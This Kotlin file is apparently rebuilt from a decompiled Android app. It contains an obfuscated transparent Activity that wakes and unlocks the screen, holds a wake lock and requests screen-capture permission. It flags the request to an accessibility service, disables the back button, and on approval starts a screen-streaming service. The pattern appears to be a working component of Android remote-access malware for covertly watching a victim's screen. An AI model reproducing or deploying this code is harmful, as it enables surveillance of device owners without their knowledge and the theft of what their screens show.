package com.storm.safe.rock.activity

import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.util.Log
import com.storm.safe.rock.MediaProjectionHolder
import com.storm.safe.rock.service.MediaDisplayService
import com.storm.safe.rock.service.MyAccessibilityService

/**
 * JADX: qixvbtmo.java (104 lines)
 * Transparent Activity that requests MediaProjection screen capture permission.
 *
 * Flow:
 * 1. onCreate: wakes screen, acquires WakeLock, starts MediaProjection permission prompt
 * 2. onActivityResult: stores permission data in MediaProjectionHolder, starts MediaDisplayService
 * 3. Broadcasts MEDIA_PROJECTION_PERMISSION_GRANTED, then finishes
 *
 * JADX references:
 * - AbstractC0241a0 → MediaProjectionHolder
 * - dqtvuisjd.f52358m1 → MyAccessibilityService.Companion (isPermissionRequesting)
 * - AbstractC0003a2.m38b9 → StringBuilder builder
 * - tz0.m214808a8 → Log.e with throwable
 */
class qixvbtmo : Activity() {

    companion object {
        private const val TAG = "qixvbtmo"
        private const val REQUEST_CODE_CAPTURE = 100
        private const val DEFAULT_QUALITY = 55
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        val hasData = data != null
        Log.d(TAG, "onActivityResult: requestCode=$requestCode, resultCode=$resultCode, data=$hasData")
        MyAccessibilityService.isPermissionRequesting = false
        if (requestCode != REQUEST_CODE_CAPTURE || resultCode != RESULT_OK || data == null) {
            Log.w(TAG, "权限被拒绝或数据无效: resultCode=$resultCode")
            finish()
            return
        }
        // Store permission data in MediaProjectionHolder
        MediaProjectionHolder.resultCode = resultCode
        MediaProjectionHolder.permissionIntent = Intent(data)
        MediaProjectionHolder.permissionTimestamp = System.currentTimeMillis()
        Log.d(
            "MediaProjectionHolder",
            "权限数据已存储: resultCode=$resultCode, 时间戳: ${MediaProjectionHolder.permissionTimestamp}"
        )
        Log.d(TAG, "权限数据已保存")

        // Start MediaDisplayService
        val serviceIntent = Intent(this, MediaDisplayService::class.java).apply {
            putExtra("action", "start")
            putExtra("resultCode", resultCode)
            putExtra("data", data)
            putExtra("quality", DEFAULT_QUALITY)
        }
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            Log.d(TAG, "已启动投屏服务")
        } catch (e: Exception) {
            Log.e(TAG, "启动投屏服务失败: ${e.message}", e)
        }

        // Broadcast permission granted
        val broadcastIntent = Intent("${packageName}.MEDIA_PROJECTION_PERMISSION_GRANTED")
        broadcastIntent.setPackage(packageName)
        sendBroadcast(broadcastIntent)
        finish()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            if (Build.VERSION.SDK_INT >= 27) {
                setShowWhenLocked(true)
                setTurnScreenOn(true)
            }
            // FLAGS: 2622464 = FLAG_KEEP_SCREEN_ON | FLAG_TURN_SCREEN_ON | FLAG_SHOW_WHEN_LOCKED | FLAG_DISMISS_KEYGUARD
            window.addFlags(2622464)
            val powerManager = getSystemService("power") as? PowerManager
            powerManager?.newWakeLock(
                PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                "App:MediaProjectionPermission"
            )?.acquire(3000L)
        } catch (e: Exception) {
            Log.e(TAG, "设置锁屏显示/唤醒失败", e)
        }

        val mediaProjectionManager = getSystemService("media_projection") as MediaProjectionManager
        @Suppress("NewApi")
        val captureIntent = if (Build.VERSION.SDK_INT >= 34) {
            mediaProjectionManager.createScreenCaptureIntent(
                android.media.projection.MediaProjectionConfig.createConfigForDefaultDisplay()
            )
        } else {
            mediaProjectionManager.createScreenCaptureIntent()
        }
        MyAccessibilityService.isPermissionRequesting = true
        startActivityForResult(captureIntent, REQUEST_CODE_CAPTURE)
    }

    override fun onBackPressed() {
        // JADX: empty — back button disabled
    }
}
